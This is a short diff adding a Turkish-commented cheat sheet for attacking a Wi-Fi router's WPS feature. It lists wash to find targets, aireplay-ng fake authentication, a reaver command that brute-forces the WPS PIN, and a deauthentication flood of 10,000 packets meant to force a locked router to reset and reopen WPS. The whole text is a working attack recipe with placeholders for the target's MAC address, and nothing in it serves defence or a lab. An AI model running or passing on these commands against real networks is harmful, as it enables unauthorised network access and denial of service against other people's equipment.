@@ -1,0 +1,10 @@
+wash -i wlan0mon
+-iki terminal ac 
+aireplay-ng --fakeauth -a <modemmacadresi> -h <kendimacadresimiz> wlan0mon // entera bas 
+reaver --bssid <modemmacadresi> --channel <kanalnumarasi:1> -i wlan0mon -A -N //ikinci terminalde bunu ac
+
+
+
+//wash -i wlan0mon kontrol et eger lock yes ise wps kendini kitlemistir.
+aireplay-ng --deauth 10000 -a <modemmacadresi> wlan0mon //fazla deauth paketi gondererek kendini resetlemeye calistiricaz boylece cihaz kendi resetleyince tekrar wps kendini acicak.
+
